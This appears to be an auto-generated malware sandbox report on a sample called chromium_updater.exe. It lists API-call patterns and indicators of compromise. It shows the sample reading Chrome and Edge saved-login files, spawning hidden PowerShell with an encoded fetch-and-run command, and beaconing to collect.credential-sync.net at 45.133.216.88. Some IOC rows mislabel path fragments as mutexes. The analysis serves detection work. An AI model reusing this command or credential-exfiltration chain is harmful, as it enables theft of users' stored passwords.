# Report,API Call Sequence Analysis Report
# Subtitle,chromium_updater.exe.jsonl · jsonl
# Generated,2026-09-17T02:29:11
# Verdict,medium
# Risk score,52
# Tools,API Sequence Visualizer v1.0.0

# Summary,"21 API calls across 1 process(es) over 7.4s of behaviour were normalised from a jsonl report. High-severity behaviour matched: Credential file staging; Network beacon setup. Dominant categories: file 8, network 8, process 2, memory 2. 15 indicators were extracted from the call arguments. Behaviour score 52/100 (medium)."

# Overview
Field,Value
Report,report-8860774426
Source,chromium_updater.exe.jsonl
Format,jsonl
Sample,chromium_updater.exe.jsonl
SHA-256,-
Machine,-
Analysis started,-
Duration,7.4s of behaviour
API calls,21 (records: 21)
Processes,1
Unique APIs,13
Patterns matched,3
Indicators,15
Behaviour score,52/100 (medium)

# Indicators of Compromise
ioc_type,value,source,confidence,context
ipv4,45.133.216.88,connect (pid 4104),0.90,"ip_address=45.133.216.88, port=443"
ipv4,45.133.216.88:443,connect (pid 4104),0.70,"ip_address=45.133.216.88, port=443"
domain,collect.credential-sync.net,gethostbyname (pid 4104),0.80,hostname=collect.credential-sync.net
file,C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.75,"file_name=C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data, desired_access=GENERIC_READ"
file,C:\Users\analyst\AppData\Local\Microsoft\Edge\User Data\Default\Login Data,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.75,"file_name=C:\Users\analyst\AppData\Local\Microsoft\Edge\User Data\Default\Login Data, desired_access=GENERIC_READ"
file,C:\Users\analyst\AppData\Local\Temp\stage1.tmp,"WriteFile (pid 4104), DeleteFileW (pid 4104)",0.75,"file_name=C:\Users\analyst\AppData\Local\Temp\stage1.tmp, size=262144"
file,C:\Users\analyst\AppData\Local\Temp\stage2.tmp,"WriteFile (pid 4104), DeleteFileW (pid 4104)",0.75,"file_name=C:\Users\analyst\AppData\Local\Temp\stage2.tmp, size=180224"
file,C:\Windows\System32\powershell.exe,CreateProcessW (pid 4104),0.75,"application_name=C:\Windows\System32\powershell.exe, command_line=powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"
file,C:\Users\analyst\AppData\Local\Google\Chrome\User,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.60,"file_name=C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data, desired_access=GENERIC_READ"
file,C:\Users\analyst\AppData\Local\Microsoft\Edge\User,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.60,"file_name=C:\Users\analyst\AppData\Local\Microsoft\Edge\User Data\Default\Login Data, desired_access=GENERIC_READ"
mutex,\Local\Google\Chrome\User,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.80,"file_name=C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data, desired_access=GENERIC_READ"
mutex,\Local\Microsoft\Edge\User,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.80,"file_name=C:\Users\analyst\AppData\Local\Microsoft\Edge\User Data\Default\Login Data, desired_access=GENERIC_READ"
mutex,\Local\Temp\stage1.tmp,"WriteFile (pid 4104), DeleteFileW (pid 4104)",0.80,"file_name=C:\Users\analyst\AppData\Local\Temp\stage1.tmp, size=262144"
mutex,\Local\Temp\stage2.tmp,"WriteFile (pid 4104), DeleteFileW (pid 4104)",0.80,"file_name=C:\Users\analyst\AppData\Local\Temp\stage2.tmp, size=180224"
command,powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA,CreateProcessW (pid 4104),0.70,"application_name=C:\Windows\System32\powershell.exe, command_line=powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"

# Section: Behavioural findings
# note,Ordered API sequences matched by the pattern engine (architecture §3.4).
Severity,Pattern,Process,Start (s),Span (s),API chain,Target
high,Credential file staging,process-4104,0.75,1.05,CreateFileW -> ReadFile -> WriteFile -> CreateFileW,C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data
high,Network beacon setup,process-4104,4.25,0.70,gethostbyname -> connect -> send,collect.credential-sync.net
medium,Repeated socket send burst,process-4104,4.95,1.05,send -> send -> send -> send,-

# Section: Finding details
item
[high] CRED-002 Credential file staging — pid 4104 (process-4104) at t=0.75s target: C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data | CreateFileW -> ReadFile -> WriteFile -> CreateFileW
[high] NET-002 Network beacon setup — pid 4104 (process-4104) at t=4.25s target: collect.credential-sync.net | gethostbyname -> connect -> send
[medium] NET-003 Repeated socket send burst — pid 4104 (process-4104) at t=4.95s | send -> send -> send -> send

# Section: Behaviour statistics
Field,Value
"Total calls (records, loop-collapsed)",21 (21)
Unique APIs,13
Processes,1
Behaviour duration,7.4s
Calls per second,2.838
Failed calls,0 (0.0%)
Collapsed repeat runs,0
Categories observed,"file, network, process, memory, system"

# Section: API category distribution
# note,Volume per category; a large memory + process share is injection-shaped.
Category,Calls,Share
file,8,38.1%
network,8,38.1%
process,2,9.5%
memory,2,9.5%
system,1,4.8%

# Section: Most frequent APIs
API,Calls
send,5
CreateFileW,2
ReadFile,2
WriteFile,2
DeleteFileW,2
GetUserNameW,1
OpenProcess,1
ReadProcessMemory,1
VirtualAlloc,1
CreateProcessW,1
gethostbyname,1
connect,1
recv,1

# Section: Recurring API sequences
# note,Frequent ordered chains mined from the call stream (maximal recurring sequences).
Steps,Support,Process,Start (s),Span (s),Chain
4,3,-,0.00,0.00,send -> send -> send -> send
3,2,-,0.00,0.00,CreateFileW -> ReadFile -> WriteFile

# Section: Frequent n-grams
Occurrences,Length,Score,Process,Chain
3,3,9,all,send -> send -> send
2,4,8,all,send -> send -> send -> send
4,2,8,all,send -> send
2,3,6,all,CreateFileW -> ReadFile -> WriteFile
2,2,4,all,CreateFileW -> ReadFile
2,2,4,all,ReadFile -> WriteFile

# Section: API transition matrix (top)
# note,First-order Markov transitions; these edges drive the behaviour graph.
From,To,Count,Probability,Process
send,send,4,80.0%,all
CreateFileW,ReadFile,2,100.0%,all
ReadFile,WriteFile,2,100.0%,all
GetUserNameW,CreateFileW,1,100.0%,all
OpenProcess,ReadProcessMemory,1,100.0%,all
ReadProcessMemory,VirtualAlloc,1,100.0%,all
VirtualAlloc,CreateProcessW,1,100.0%,all
CreateProcessW,gethostbyname,1,100.0%,all
gethostbyname,connect,1,100.0%,all
connect,send,1,100.0%,all
recv,DeleteFileW,1,100.0%,all
DeleteFileW,DeleteFileW,1,100.0%,all
WriteFile,CreateFileW,1,50.0%,all
WriteFile,OpenProcess,1,50.0%,all
send,recv,1,20.0%,all

# Section: Reconstructed process tree
Process,PID,Parent,First seen (s),Calls,Failures,Top categories,Path
process-4104,4104,-,0.40,21,0,"file:8, network:8, process:2, memory:2",-

# Section: Suspicious process notes
item
PID 4104 process-4104: process + memory APIs (injection-capable)

# Section: Highest-probability behaviour paths
item
send -> recv -> DeleteFileW
CreateFileW -> ReadFile -> WriteFile -> OpenProcess -> ReadProcessMemory -> VirtualAlloc -> CreateProcessW -> gethostbyname
ReadFile -> WriteFile -> CreateFileW
WriteFile -> CreateFileW -> ReadFile
GetUserNameW -> CreateFileW -> ReadFile -> WriteFile -> OpenProcess -> ReadProcessMemory -> VirtualAlloc -> CreateProcessW
OpenProcess -> ReadProcessMemory -> VirtualAlloc -> CreateProcessW -> gethostbyname -> connect -> send -> recv
ReadProcessMemory -> VirtualAlloc -> CreateProcessW -> gethostbyname -> connect -> send -> recv -> DeleteFileW
VirtualAlloc -> CreateProcessW -> gethostbyname -> connect -> send -> recv -> DeleteFileW
CreateProcessW -> gethostbyname -> connect -> send -> recv -> DeleteFileW
gethostbyname -> connect -> send -> recv -> DeleteFileW

# Section: Indicators of Compromise
Type,Value,Source,Confidence,Context
ipv4,45.133.216.88,connect (pid 4104),0.90,"ip_address=45.133.216.88, port=443"
ipv4,45.133.216.88:443,connect (pid 4104),0.70,"ip_address=45.133.216.88, port=443"
domain,collect.credential-sync.net,gethostbyname (pid 4104),0.80,hostname=collect.credential-sync.net
file,C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.75,"file_name=C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data, desired_access=GENERIC_READ"
file,C:\Users\analyst\AppData\Local\Microsoft\Edge\User Data\Default\Login Data,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.75,"file_name=C:\Users\analyst\AppData\Local\Microsoft\Edge\User Data\Default\Login Data, desired_access=GENERIC_READ"
file,C:\Users\analyst\AppData\Local\Temp\stage1.tmp,"WriteFile (pid 4104), DeleteFileW (pid 4104)",0.75,"file_name=C:\Users\analyst\AppData\Local\Temp\stage1.tmp, size=262144"
file,C:\Users\analyst\AppData\Local\Temp\stage2.tmp,"WriteFile (pid 4104), DeleteFileW (pid 4104)",0.75,"file_name=C:\Users\analyst\AppData\Local\Temp\stage2.tmp, size=180224"
file,C:\Windows\System32\powershell.exe,CreateProcessW (pid 4104),0.75,"application_name=C:\Windows\System32\powershell.exe, command_line=powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"
file,C:\Users\analyst\AppData\Local\Google\Chrome\User,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.60,"file_name=C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data, desired_access=GENERIC_READ"
file,C:\Users\analyst\AppData\Local\Microsoft\Edge\User,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.60,"file_name=C:\Users\analyst\AppData\Local\Microsoft\Edge\User Data\Default\Login Data, desired_access=GENERIC_READ"
mutex,\Local\Google\Chrome\User,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.80,"file_name=C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data, desired_access=GENERIC_READ"
mutex,\Local\Microsoft\Edge\User,"CreateFileW (pid 4104), ReadFile (pid 4104)",0.80,"file_name=C:\Users\analyst\AppData\Local\Microsoft\Edge\User Data\Default\Login Data, desired_access=GENERIC_READ"
mutex,\Local\Temp\stage1.tmp,"WriteFile (pid 4104), DeleteFileW (pid 4104)",0.80,"file_name=C:\Users\analyst\AppData\Local\Temp\stage1.tmp, size=262144"
mutex,\Local\Temp\stage2.tmp,"WriteFile (pid 4104), DeleteFileW (pid 4104)",0.80,"file_name=C:\Users\analyst\AppData\Local\Temp\stage2.tmp, size=180224"
command,powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA,CreateProcessW (pid 4104),0.70,"application_name=C:\Windows\System32\powershell.exe, command_line=powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"
